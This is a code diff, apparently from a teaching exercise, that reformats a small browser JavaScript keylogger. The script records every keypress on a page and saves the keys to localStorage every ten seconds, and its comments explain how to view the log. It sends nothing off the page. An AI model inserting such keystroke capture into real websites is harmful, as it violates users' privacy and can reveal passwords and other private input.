@@ -3,8 +3,8 @@ var text = "";
 
 // Apliquem el escoltador d'events
 document.onkeydown = function(evt) {
-  evt = evt || window.event; // Per IE
-  text += evt.key;
+    evt = evt || window.event; // Per IE
+    text = text + evt.key;
 };
 
 // Enmagatzenar el text en el localstorage cada 10 segons
@@ -14,8 +14,8 @@ document.onkeydown = function(evt) {
 // Aplicación > localStorage
 // o fent un localStorage.getItem("keylogger");
 const intervalo = setInterval(() => {
-  let textAnterior = localStorage.getItem("keylogger");
-  if (textAnterior) text += textAnterior;
-  localStorage.setItem("keylogger", text);
-  text = "";
+    let textAnterior = localStorage.getItem("keylogger");
+    if (textAnterior) text += textAnterior;
+    localStorage.setItem("keylogger", text);
+    text = "";
 }, 10000);
